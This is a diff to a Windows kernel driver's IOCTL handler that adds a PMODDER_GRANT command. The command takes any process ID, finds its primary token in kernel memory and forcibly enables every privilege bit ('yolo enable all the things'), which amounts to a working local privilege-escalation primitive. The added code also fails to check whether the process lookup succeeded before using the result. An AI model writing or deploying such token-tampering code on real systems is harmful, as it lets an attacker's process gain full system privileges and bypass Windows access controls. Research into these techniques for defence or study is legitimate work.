@@ -188,6 +188,44 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
 
 		break;
 	}
+	case PMODDER_GRANT:
+	{
+		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(InputParameters))
+		{
+			status = STATUS_BUFFER_TOO_SMALL;
+			KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
+			break;
+		}
+
+		InputParameters *input = (InputParameters*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+
+		if (input == nullptr)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
+			break;
+		}
+
+		// dt nt!_EPROCESS
+		PEPROCESS eProcess = NULL;
+		status = PsLookupProcessByProcessId((HANDLE)input->pid, &eProcess);
+
+		// dt nt!_TOKEN
+		PACCESS_TOKEN pToken = PsReferencePrimaryToken(eProcess);
+		PPROCESS_PRIVILEGES tokenPrivs = (PPROCESS_PRIVILEGES)((ULONG_PTR)pToken + PROCESS_PRIVILEGE_OFFSET[windowsVersion]);
+
+		// yolo enable all the things
+		tokenPrivs->Present[0] = tokenPrivs->Enabled[0] = 0xff;
+		tokenPrivs->Present[1] = tokenPrivs->Enabled[1] = 0xff;
+		tokenPrivs->Present[2] = tokenPrivs->Enabled[2] = 0xff;
+		tokenPrivs->Present[3] = tokenPrivs->Enabled[3] = 0xff;
+		tokenPrivs->Present[4] = tokenPrivs->Enabled[4] = 0xff;
+
+		PsDereferencePrimaryToken(pToken);
+		ObDereferenceObject(eProcess);
+
+		break;
+	}
 	default:
 		status = STATUS_INVALID_DEVICE_REQUEST;
 		DbgPrint("[!] STATUS_INVALID_DEVICE_REQUEST\n");
